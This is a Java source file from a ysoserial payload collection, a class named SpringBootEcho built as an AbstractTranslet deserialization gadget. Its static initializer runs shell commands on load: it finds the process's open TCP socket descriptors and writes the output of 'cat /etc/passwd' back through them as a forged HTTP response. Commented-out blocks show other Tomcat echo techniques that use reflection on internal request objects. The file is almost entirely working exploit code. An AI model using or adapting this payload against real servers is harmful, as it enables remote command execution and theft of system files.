package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
//import org.apache.catalina.connector.Connector;
//import org.apache.catalina.core.ApplicationContext;
//import org.apache.catalina.core.StandardContext;
//import org.apache.catalina.core.StandardService;
//import org.apache.coyote.RequestInfo;
//import org.apache.catalina.core.ApplicationContext;
//import org.apache.catalina.core.StandardContext;
//import org.apache.tomcat.util.descriptor.web.FilterMap;


//import javax.servlet.*;
//import java.io.IOException;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.lang.reflect.InvocationTargetException;
//import java.lang.reflect.Modifier;

public class SpringBootEcho extends AbstractTranslet {

    static {
        try {

/*
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField("headerBufferSize");
            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
            contextField.setAccessible(true);
            headerSizeField.setAccessible(true);
            serviceField.setAccessible(true);
            requestField.setAccessible(true);
            getHandlerMethod.setAccessible(true);
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
            for (int i = 0; i < connectors.length; i++) {
                if (4 == connectors[i].getScheme().length()) {
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
                        for (int j = 0; j < classes.length; j++) {
                            // org.apache.coyote.AbstractProtocol$ConnectionHandler
                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
                                java.lang.reflect.Field globalField = classes[j].getDeclaredField("global");
                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                                globalField.setAccessible(true);
                                processorsField.setAccessible(true);
                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                                for (int k = 0; k < list.size(); k++) {
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));
                                    // 10000 为修改后的 headersize
                                    headerSizeField.set(tempRequest.getInputBuffer(),10000);
                                }
                            }
                        }
                        // 10000 为修改后的 headersize
                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(10000);
                    }
                }
            }
*/

/*
            Field wrap_same_object = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            lastServicedRequest.setAccessible(true);
            lastServicedResponse.setAccessible(true);
            wrap_same_object.setAccessible(true);
            //修改final
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~Modifier.FINAL);

            boolean wrap_same_object1 = wrap_same_object.getBoolean(null);
            ThreadLocal<ServletRequest> requestThreadLocal = (ThreadLocal<ServletRequest>) lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> responseThreadLocal = (ThreadLocal<ServletResponse>) lastServicedResponse.get(null);

            // wrap_same_object.setBoolean(null, true);
            lastServicedRequest.set(null, new ThreadLocal<ServletRequest>());
            lastServicedResponse.set(null, new ThreadLocal<ServletResponse>());
            org.apache.catalina.connector.Response servletResponse = null;//(org.apache.catalina.connector.Response)responseThreadLocal.get();
            org.apache.catalina.connector.Request servletRequest = ( org.apache.catalina.connector.Request)requestThreadLocal.get();
            servletResponse = servletRequest.getResponse();


            String[] cmds = null;


            cmds = new String[]{"sh", "-c", "touch /tmp/pwned && cat /tmp/flag"};
            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();

            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            servletResponse.getOutputStream();
            java.io.Writer writer = servletResponse.getWriter();
            writer.write(output);
            writer.flush();
            writer.close();
*/

            String[] cmd = { "/bin/sh", "-c", "inode=`cat /proc/net/tcp|tail -n +2|awk '{if($4==\"01\")print}'|awk '{print $10}'`;for i in $inode; do fd=`ls -l /proc/$PPID/fd|grep socket|grep $i|awk '{print $9}'`; if [ ${#fd} -gt 0 ]; then echo -n $fd-;fi;done;"};
            java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
            java.io.BufferedReader br = new java.io.BufferedReader(isr);
            StringBuilder stringBuilder = new StringBuilder();
            String line;

            while ((line = br.readLine()) != null){
                stringBuilder.append(line);
            }

            System.out.println(stringBuilder.toString());
            String s = stringBuilder.toString().substring(0,stringBuilder.toString().length()-1);
            String[] temp = s.split("-");;

            for(int i=0;i<temp.length;i++) {
                int num = Integer.valueOf(temp[i]).intValue();


                cmd = new String[]{"/bin/sh", "-c", "touch /tmp/pwned && cat /etc/passwd"};

                in = Runtime.getRuntime().exec(cmd).getInputStream();
                isr = new java.io.InputStreamReader(in);
                br = new java.io.BufferedReader(isr);
                stringBuilder = new StringBuilder();

                while ((line = br.readLine()) != null) {
                    stringBuilder.append(line);
                }

                String ret = "HTTP/1.1 200\r\nContent-Length: "+Integer.toString(stringBuilder.toString().length()) +
                    "\r\n\r\n"+stringBuilder.toString();
                java.lang.reflect.Constructor c = java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
                c.setAccessible(true);

                java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor) c.newInstance(new Object[]{new Integer(num)}));
                os.write(ret.getBytes());
                os.close();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
